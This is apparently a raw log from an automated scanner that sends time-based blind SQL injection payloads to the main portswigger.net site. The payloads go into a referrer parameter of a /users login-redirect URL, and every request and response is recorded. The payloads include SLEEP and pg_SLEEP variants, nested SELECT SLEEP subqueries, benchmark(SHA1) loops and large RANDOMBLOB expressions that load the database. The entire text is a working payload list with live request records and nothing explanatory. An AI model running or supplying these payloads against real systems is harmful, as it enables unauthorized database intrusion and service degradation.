+2024-07-26 12:23:40,707 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20pg_SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:23:41,778 - INFO - [12:23:41] Payload testing: or pg_SLEEP(5)#
+2024-07-26 12:23:41,783 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:44,235 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%5C%22 HTTP/1.1" 200 None
+2024-07-26 12:23:44,549 - INFO - [12:23:44] Payload testing: '\"
+2024-07-26 12:23:44,549 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:46,219 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAnD%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:23:46,692 - INFO - [12:23:46] Payload testing: AnD SLEEP(5)
+2024-07-26 12:23:46,697 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:47,855 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAnD%20SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:23:48,201 - INFO - [12:23:48] Payload testing: AnD SLEEP(5)--
+2024-07-26 12:23:48,206 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:49,321 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAnD%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:23:49,689 - INFO - [12:23:49] Payload testing: AnD SLEEP(5)#
+2024-07-26 12:23:49,694 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:51,072 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input&&SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:23:51,478 - INFO - [12:23:51] Payload testing: &&SLEEP(5)
+2024-07-26 12:23:51,483 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:53,096 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input&&SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:23:53,473 - INFO - [12:23:53] Payload testing: &&SLEEP(5)--
+2024-07-26 12:23:53,473 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:54,618 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input&&SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:23:54,951 - INFO - [12:23:54] Payload testing: &&SLEEP(5)#
+2024-07-26 12:23:54,956 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:56,226 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20AnD%20SLEEP(5)%20ANd%20'1 HTTP/1.1" 200 None
+2024-07-26 12:23:56,563 - INFO - [12:23:56] Payload testing: ' AnD SLEEP(5) ANd '1
+2024-07-26 12:23:56,567 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:57,724 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'&&SLEEP(5)&&'1 HTTP/1.1" 200 None
+2024-07-26 12:23:58,030 - INFO - [12:23:58] Payload testing: '&&SLEEP(5)&&'1
+2024-07-26 12:23:58,034 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:23:59,285 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputORDER%20BY%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:23:59,630 - INFO - [12:23:59] Payload testing: ORDER BY SLEEP(5)
+2024-07-26 12:23:59,645 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:00,839 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputORDER%20BY%20SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:24:01,197 - INFO - [12:24:01] Payload testing: ORDER BY SLEEP(5)--
+2024-07-26 12:24:01,201 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:02,384 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputORDER%20BY%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:24:02,722 - INFO - [12:24:02] Payload testing: ORDER BY SLEEP(5)#
+2024-07-26 12:24:02,727 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:03,918 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj) HTTP/1.1" 200 None
+2024-07-26 12:24:04,273 - INFO - [12:24:04] Payload testing: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+2024-07-26 12:24:04,278 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:05,500 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj) HTTP/1.1" 200 None
+2024-07-26 12:24:05,818 - INFO - [12:24:05] Payload testing: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+2024-07-26 12:24:05,818 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:07,017 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)-- HTTP/1.1" 200 None
+2024-07-26 12:24:07,345 - INFO - [12:24:07] Payload testing: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+2024-07-26 12:24:07,349 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:08,573 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input+benchmark(3200,SHA1(1))+' HTTP/1.1" 200 None
+2024-07-26 12:24:08,882 - INFO - [12:24:08] Payload testing: +benchmark(3200,SHA1(1))+'
+2024-07-26 12:24:08,885 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:10,048 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input+%20SLEEP(10)%20+%20' HTTP/1.1" 200 None
+2024-07-26 12:24:10,372 - INFO - [12:24:10] Payload testing: + SLEEP(10) + '
+2024-07-26 12:24:10,377 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:11,822 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputRANDOMBLOB(500000000/2) HTTP/1.1" 200 None
+2024-07-26 12:24:12,242 - INFO - [12:24:12] Payload testing: RANDOMBLOB(500000000/2)
+2024-07-26 12:24:12,247 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:13,342 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%202947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) HTTP/1.1" 200 None
+2024-07-26 12:24:13,663 - INFO - [12:24:13] Payload testing: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+2024-07-26 12:24:13,663 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:14,810 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputOR%202947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) HTTP/1.1" 200 None
+2024-07-26 12:24:15,187 - INFO - [12:24:15] Payload testing: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+2024-07-26 12:24:15,187 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:16,378 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputRANDOMBLOB(1000000000/2) HTTP/1.1" 200 None
+2024-07-26 12:24:16,724 - INFO - [12:24:16] Payload testing: RANDOMBLOB(1000000000/2)
+2024-07-26 12:24:16,729 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:17,933 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%202947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1" 200 None
+2024-07-26 12:24:18,301 - INFO - [12:24:18] Payload testing: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+2024-07-26 12:24:18,306 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:19,459 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputOR%202947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) HTTP/1.1" 200 None
+2024-07-26 12:24:19,788 - INFO - [12:24:19] Payload testing: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+2024-07-26 12:24:19,793 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:24:20,961 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(1)/*'%20or%20SLEEP(1)%20or%20'%22%20or%20SLEEP(1)%20or%20%22*/ HTTP/1.1" 200 None
+2024-07-26 12:24:21,243 - INFO - [12:24:21] Payload testing: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
